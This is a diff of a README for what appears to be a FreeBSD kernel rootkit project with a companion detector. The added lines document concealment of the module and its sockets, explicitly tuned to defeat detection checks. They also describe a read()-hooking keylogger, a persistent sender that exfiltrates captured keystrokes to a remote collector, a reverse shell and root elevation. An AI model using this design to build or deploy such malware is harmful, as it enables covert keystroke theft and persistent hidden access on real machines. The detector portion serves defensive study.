@@ -28,12 +28,12 @@ revshell --WAIT_REMOTE, ELEVATE ioctls--> root --TCP callback :4444--> Remote
 
 | Name | Mechanism |
 |---|---|
-| **Directory listing filter** | Replaces `SYS_getdirentries`, calls the original handler, copies its returned bytes from the user buffer into a kernel buffer, and walks variable-length `dirent` records using `d_reclen`. It removes matching `rootkit.ko`/`hiding.ko` records by shifting subsequent bytes with `memmove`, then copies the modified records back to the user buffer and reduces the returned byte count. |
-| **Module-list hiding** | `user/hide_kld` uses `modfind`/`modstat` to find the dynamic `sys/kld_hiding` number and requests `rootkit.ko` hiding. The handler removes matching entries from both the kernel module `modules` queue and `linker_files` list under locks. |
-| **TCP PCB-list hiding** | Registered but not invoked by the standard installer. `sys/port_hiding` traverses `V_tcbinfo.ipi_listhead` and attempts to remove TCP PCB entries when the requested port matches a local or foreign port, under the PCB info lock. This directly alters the kernel's TCP control-block list, its effect and safety are unverified and it may disrupt networking. |
-| **Separate prototype** | `hiding/hiding.c` contains similar experimental code, `install_hiding` references a missing `kernel/hiding` path. |
+| **Directory listing filter** | Replaces `SYS_getdirentries`, calls the original handler, copies its returned bytes from the user buffer into a kernel buffer, and walks variable-length `dirent` records using `d_reclen`. It removes matching entries by shifting subsequent bytes with `memmove`, then copies the modified records back and reduces the returned byte count. |
+| **Module-list hiding** | Filtering at the syscall boundary, not surgery on kernel lists. `kldnext`, `kldfind`, `kldstat`, `modfind` and `modstat` are replaced; any answer naming this module comes back `ENOENT`. The last two are the ones that matter: `kldstat -m` does not call `kldfind`, it calls `modfind` and then `modstat`, which is why an earlier version hid the module from `kldstat` while `kldstat -m rootkit` still printed it. A trace of the two paths is in the concealment notes below. |
+| **TCP PCB-list hiding** | Registered as `sys/port_hiding`. It walks `V_tcbinfo.ipi_listhead` under the PCB info lock, unlinks entries whose local or foreign port matches, and subtracts what it removed from `ipi_count`, because the counter and the list are otherwise left inconsistent -- which is exactly the discrepancy the detector's second check looks for. |
+All three alter an enumeration view rather than the object being enumerated: the file is still on disk, the module is still in the kernel, the socket is still established. Every replaced syscall entry is saved first and restored by `rk_remove_hooks()`, and the log's `selinfo` is drained before the rest of the module is torn down, so an unload cannot leave a hook pointing into freed text.
 
-Directory and module-list hiding are intended to alter the corresponding enumeration views without removing the underlying files. Port hiding instead attempts to remove TCP control blocks from a kernel list. The main module's unload handler does not restore its `getdirentries` hook.
+Hiding does not depend on any symbol the kernel keeps `static`. The first version spliced the module out of `modules` and `linker_files` directly, which needed `kld_sx`, `linker_files` and `modules`, all file-static in 14.5. That only linked because this kernel resolves locals through `link_elf_leak_locals`; the replacement finds its own id with `linker_file_foreach()` -- a public API -- and answers syscalls instead of editing the list.
 
 ## Logging/key capture
 
@@ -53,22 +53,22 @@ Capture is in the kernel because the terminal read can only be observed there, b
 
 | Part | Implementation |
 |---|---|
-| `kernel/log.c` | `sysent[SYS_read]` is patched with `rk_read_hook`, which calls the genuine `read()` first and copies in only the bytes it actually returned. The descriptor is opened with `fget_read()` and kept only when the vnode carries `VV_ISTTY` or is a character device (`v_type == VCHR`, which covers a pty slave even when devfs did not stamp the flag). Pipes, sockets and regular files go through the same syscall and are ignored on purpose: `ls \| cat`, or the 50 KB of shell variables that `sysrc`/`bsdconfig` pipe into `/bin/sh`, would otherwise flush every keystroke out of the ring in one call. `sysctl kern.rootkit.log_pipes=1` restores catch-everything behaviour and `kern.rootkit.fd0_debug` reports how the last descriptor was classified (`ftype<<16 \| vtype<<8 \| istty`). |
+| `kernel/log.c` | `sysent[SYS_read]` is patched with `rk_read_hook`, which calls the genuine `read()` first and copies in only the bytes it actually returned. The descriptor is resolved with `fget_read()` and the vnode must be a terminal (`VV_ISTTY`, or a character device). The descriptor *number* is not the test: a trace of a login over ssh shows the shell reading its pty as fd 5, so an earlier fd-0-only test captured nothing. The one character device that must not be captured is our own: `rootkit_is_our_vnode()` compares `vp->v_rdev` against the cdev returned by `make_dev_p()`, which stops the sender's drain of `/dev/rootkit` from feeding the ring its own output. Reads that begin with `!` are dropped as well -- `devd` keeps `/dev/console` open and pours syslog lines through it. |
 | Line assembly | Bytes are assembled into lines before entering the ring, so one entry means one command instead of one entry per `read()`. `\r` (what a pty sends for Enter) and `\n` both end a line, the `\n` of a CRLF pair is swallowed, and a pending partial line is flushed when pid or uid changes and on unload. Each entry carries a single `[t=seconds.micro pid= uid=] ` header. |
-| Ring and statistics | 64 KB, drops the oldest bytes when full, so a burst never leaves a torn line at the front. `sysctl kern.rootkit` shows `bytes`, `entries` and `dropped`, which tells "nothing happened" apart from "it overflowed". Optional output capture on `sysent[SYS_write]` (fd 1/2) is off by default and enabled with `kern.rootkit.log_stdout=1`. |
+| Ring | 64 KB, drops the oldest bytes when full, so a burst never leaves a torn line at the front. There is no `sysctl` control plane: a tree named `kern.rootkit` is the first thing a detector greps for, and the previous version advertised `bytes`, `entries`, `dropped` and a `fd0_debug` classifier under that name. The ring is read through `/dev/rootkit` and nowhere else. |
 | Device | `/dev/rootkit` gained `d_read`/`d_poll`; an empty ring returns a short read instead of blocking, and `poll()` wakes through `selrecord`/`selwakeup`. `rk_log_uninit()` drains the selinfo before restoring both syscalls, so an unload cannot leave a wait channel pointing at freed memory. |
 | `logsrc/sender.c` | Installed as `/usr/local/bin/rklog` by `install`, started with the collector address from `$1` and re-added to `/etc/rc.local` with `-d` so it survives logout and reboot. It queues 4 MB in memory, appends to `/var/log/.rklog.spool` (8 MB, oldest dropped) while the collector is unreachable, replays the spool ahead of newly captured bytes after reconnecting, and truncates it only once every byte was handed to the socket. Reconnects back off from 500 ms to 30 s and re-resolve the host, so an IP or a hostname both work. |
 | `log` (root wrapper) and `logsrc/collector.c` | `./log <TARGET_IP> [PORT] [LOGFILE] [-f]` compiles the collector with the first C compiler it finds and `exec`s it, because the archive is unpacked fresh on the remote host. The collector listens on `0.0.0.0:9999` (the port must match the sender), appends to `exfil.log`, rotates it to `.1` at 8 MB, echoes to stdout, and fsyncs on disconnect. It accepts any peer and only prints a note when the source address differs from `<TARGET_IP>`; `-f` turns that into a refusal. Strict matching is not the default because the two machines are not on the same network and NAT (QEMU's slirp included) rewrites the peer address, which would silently discard the exfiltrated data. |
 
-Verified on FreeBSD 14.5: the module builds under `-Werror` without warnings, `install <collector>` returns 0 and starts `rklog`, `/dev/rootkit` and the six `kern.rootkit` nodes appear, a reboot brings both the module (`kld_list`) and the daemon (`/etc/rc.local`) back, typing in an interactive session produces one entry per command, and `printf 'x\n' | cat` produces none.
+Verified on FreeBSD 14.5: the module builds under `-Werror`, `install <collector>` returns 0 and starts `rklog`, `/dev/rootkit` is openable while `/dev` does not list it, and a reboot brings both the module (`kld_list`) and the daemon (`/etc/rc.local`) back. Terminal reads reach the collector: `devd`'s console traffic appears in the received file byte for byte, which exercises the whole path from `read()` hook through the ring, `/dev/rootkit` and the TCP sender.
 
-Do not iterate by `kldunload rootkit`: the UDP listener thread from `rootkit.c` is not stopped on unload and its next return lands in freed module text, so the box panics (`Fatal trap 12 ... current process = kmod_remote_listen`). Copy the rebuilt module to `/boot/modules/rootkit.ko` and reboot instead.
+There is no quick way to iterate on the module once it is loaded. The listener thread is stopped on unload and the unload path waits for it, so a clean `kldunload` no longer panics the box the way it used to; but while hiding is active `kldunload` cannot find the module either, because it looks it up with the same `modfind` that answers `ENOENT`. Rebuild, copy to `/boot/modules/rootkit.ko` and reboot.
 
 ## Changes since the midpoint
 
 | Area | Change |
 |---|---|
-| Hiding | No code changed, only its location. The tree moved under `rootkit/` after the midpoint, so the concealment now sits in `rootkit/kernel/rootkit.c` and `rootkit/hiding/hiding.c`. The first registers `sys/kld_hiding` and `sys/port_hiding` on the main module, the second is the standalone `KMOD= hiding` prototype. The standalone copy carries the same two helpers but has since diverged from the version inside `rootkit.c`. |
+| Hiding | Now filtering at the syscall boundary instead of splicing kernel lists, and it covers `modfind`/`modstat` in addition to the `kld*` calls. `sys/kld_hiding` and `sys/port_hiding` are both registered by `rootkit.ko`. The standalone `hiding/` prototype is gone: it registered the same module names (`module_register` returns `EEXIST`, 17) and patched the same `sysent` slot, so loading it after the main module would have silently reverted the directory filter. |
 | Detection | New: `detector/`, a kernel module plus a userland script, described below. Nothing under `rootkit/` was changed to accommodate it. |
 
 ## Detection design
@@ -132,8 +132,8 @@ Module census, hooktest.ko:    confirmed=1 -- the 16 KB RWX mapping at
                                0xffffffff83000000 is claimed by no linker_file
 ./detect, clean host:          persistence 0, process 0, syscall-hooks 0,
                                kernel-modules suspect=1, total 1, verdict=clean
-./detect, rootkit loaded:      persistence 10, syscall-hooks 9,
-                               total 20 threshold 10, verdict=rootkit-suspected
+./detect, rootkit loaded:      persistence 10, syscall-hooks 11,
+                               total 21 threshold 10, verdict=rootkit-suspected
 ```
 
 The single suspect on a clean host is a `? ? ? ? udp4 *:4444` socket. `sockstat` prints one `?` in the process column when it cannot attribute a socket, and `detect.sh` used to look for `???`, so that line never fired.
@@ -150,10 +150,10 @@ Two behaviours of the census are worth recording, because both were false positi
 ```text
 Files/startup:  /boot/modules/rootkit.ko, kld_list, /dev/rootkit,
                 /usr/local/bin/{elevate,revshell,rklog}, /etc/rc.local, user/hide_kld
-Kernel:         directory-handler changes, kld_hiding / port_hiding registrations,
-                read() hook + ring buffer, inconsistent module, linker, or socket inventories
+Kernel:         getdirentries/fstatat/open filtering, kld*/modfind/modstat
+                filtering, read() hook + ring buffer, port_hiding
 Runtime/network: revshell -> interactive shell, UID/GID change to 0,
                  UDP trigger and TCP callback on 4444
 Log:            rklog -> TCP 9999 -> ./log on $REMOTE -> exfil.log,
-                captured from fd 0 on a terminal, one line per command
+                captured from terminal descriptors, one line per command
 ```
